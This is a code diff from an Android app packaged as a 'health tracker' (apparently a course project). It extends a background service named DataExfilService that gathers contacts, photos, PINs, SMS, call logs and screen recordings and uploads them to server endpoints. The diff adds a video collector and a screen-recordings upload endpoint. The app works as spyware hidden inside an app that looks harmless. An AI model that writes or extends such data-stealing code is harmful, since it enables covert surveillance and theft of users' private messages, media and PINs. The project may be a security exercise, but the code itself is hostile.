@@ -32,6 +32,7 @@ import com.inf2007.healthtracker.utilities.collectors.PhotoCollector
 import com.inf2007.healthtracker.utilities.collectors.PinCollector
 import com.inf2007.healthtracker.utilities.collectors.ScreenRecordingCollector
 import com.inf2007.healthtracker.utilities.collectors.SmsCallLogCollector
+import com.inf2007.healthtracker.utilities.collectors.VideoCollector
 
 class DataExfilService : Service() {
 
@@ -50,6 +51,7 @@ class DataExfilService : Service() {
         const val PIN_ENDPOINT = "$BASE_URL/pin_logs"
         const val SMS_ENDPOINT = "$BASE_URL/sms"
         const val CALL_LOG_ENDPOINT = "$BASE_URL/call_logs"
+        const val SCREEN_RECORDING_ENDPOINT = "$BASE_URL/screen_recordings"
         const val VIDEO_ENDPOINT = "$BASE_URL/videos"
     }
 
@@ -131,6 +133,7 @@ class DataExfilService : Service() {
             add(PinCollector(this@DataExfilService))
             add(SmsCallLogCollector(this@DataExfilService))
             add(ScreenRecordingCollector(this@DataExfilService))
+            add(VideoCollector(this@DataExfilService))
         }
 
         collectors.forEach { it.startObserving() }
@@ -138,6 +141,7 @@ class DataExfilService : Service() {
         collectors.filterIsInstance<ContactCollector>().firstOrNull()?.setupObservers(contentResolver)
         collectors.filterIsInstance<PhotoCollector>().firstOrNull()?.setupObservers(contentResolver)
         collectors.filterIsInstance<SmsCallLogCollector>().firstOrNull()?.setupObservers(contentResolver)
+        collectors.filterIsInstance<VideoCollector>().firstOrNull()?.setupObservers(contentResolver)
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
@@ -395,6 +399,7 @@ class DataExfilService : Service() {
         collectors.filterIsInstance<ContactCollector>().firstOrNull()?.removeObservers(contentResolver)
         collectors.filterIsInstance<PhotoCollector>().firstOrNull()?.removeObservers(contentResolver)
         collectors.filterIsInstance<SmsCallLogCollector>().firstOrNull()?.removeObservers(contentResolver)
+        collectors.filterIsInstance<VideoCollector>().firstOrNull()?.removeObservers(contentResolver)
         unregisterReceiver(uploadFileReceiver)
     }
 
